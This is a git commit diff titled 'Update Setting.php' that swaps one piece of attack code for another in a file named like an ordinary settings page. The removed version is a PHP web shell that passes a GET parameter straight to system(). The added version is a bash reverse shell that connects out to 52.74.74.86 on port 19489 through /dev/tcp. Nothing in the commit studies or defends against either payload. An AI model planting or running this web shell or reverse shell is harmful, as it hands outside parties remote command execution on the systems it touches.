8038c47e2a00f16a27a41207743aa8e43f01e6f4
Harpreet Brar <iamunknowniint@gmail.com>
2025-07-03 18:03:44 +0500

    Update Setting.php

--- Setting.php
+++ Setting.php
@@ -1,16 +1,4 @@
-<html>
-<body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-<input type="text" name="command" autofocus id="command" size="50">
-<input type="submit" value="Execute">
-</form>
-<pre>
-<?php
-    if(isset($_GET['command'])) 
-    {
-        system($_GET['command'] . ' 2>&1'); 
-    }
-?>
-</pre>
-</body>
-</html>
+#!/bin/bash
+
+# Reverse shell to 52.74.74.86:19489 using bash and TCP
+bash -i >& /dev/tcp/52.74.74.86/19489 0>&1
